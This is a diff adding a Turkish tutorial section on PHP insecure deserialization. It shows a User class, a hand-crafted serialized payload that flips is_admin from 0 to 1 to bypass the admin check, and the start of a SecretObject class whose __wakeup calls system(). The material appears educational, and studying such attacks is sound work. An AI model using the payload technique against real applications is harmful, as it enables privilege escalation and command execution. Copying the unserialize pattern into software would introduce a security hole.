@@ -335,3 +335,92 @@ echo $user;
 SINIF UYANDIRILDI! Ahmet Ince Object destruction: Ahmet Ince
 ```
 
+Class'ımıza yeni bir değişken daha ekleyelim.
+
+```
+<?php
+
+class User{
+    var $firstname;
+    var $lastname;
+    var $is_admin = 0;
+    function __construct($firstname="",$lastname="")
+    {
+        $this->firstname = $firstname;
+        $this->lastname = $lastname;
+    }
+    function __toString(){
+        return $this->firstname." ".$this->lastname."\n";
+    }
+    function __destruct(){
+        echo "Object destruction: ".$this->firstname." ".$this->lastname;
+    }
+    function __wakeup(){
+        echo "SINIF UYANDIRILDI! ";
+    }
+    public function is_Admin(){
+        if ($this->is_admin){
+            return True;
+        return False;
+    }
+}
+
+}
+
+$user = new User("Mehmet","Ince");
+
+$store_somewhere = serialize($user);
+```
+
+Class'ımıza is_admin ekledikten sonra tekrar serialize işlemini yapınca kod çıktısı aşağıdaki gibi oluyor ve artık objemizde yeni bir attribute daha geldi. Bu attribute is_admin oluyor.
+
+```
+O:4:"User":3:{s:9:"firstname";s:6:"Mehmet";s:8:"lastname";s:5:"İnce";s:8:"is_admin";i:0;}Object destruction: Mehmet İnce
+```
+
+Deserialize.php koduna objenin yeni halini ekleyip 0 değerini 1 yapıyoruz. Çıktıyı daha okunabilir hale getirmek için class'taki destruct ve wakeup fonksiyonlarını yorum satırı yapıyoruz.
+
+```
+<?php
+
+require_once("user_class.php");
+
+$payload = "";
+
+$payload = 'O:4:"User":3:{s:9:"firstname";s:6:"Mehmet";s:8:"lastname";s:5:"İnce";s:8:"is_admin";i:1;}';
+
+$user = unserialize( $payload);
+
+echo $user->is_Admin();
+```
+
+Çıktıda 1 sonucunu alıyoruz.
+
+```
+PS C:\Users\Samed\php_proje\php_kodları> php deserialize.php
+1
+```
+
+Deserialize.php koduna SecretObject isminde bir class oluşturalım. Kontrol edebildiğimiz string ifade ile bu sınıfa ait kritik fonksiyonları çalıştırabiliriz.
+
+```
+<?php
+
+require_once("user_class.php");
+
+class SecretObject{
+
+    var $filename;
+    function __wakeup(){
+        system("");
+    }
+}
+
+$payload = "";
+
+$payload = 'O:4:"User":3:{s:9:"firstname";s:6:"Mehmet";s:8:"lastname";s:5:"İnce";s:8:"is_admin";i:1;}';
+
+$user = unserialize( $payload);
+
+echo $user->is_Admin();
+```
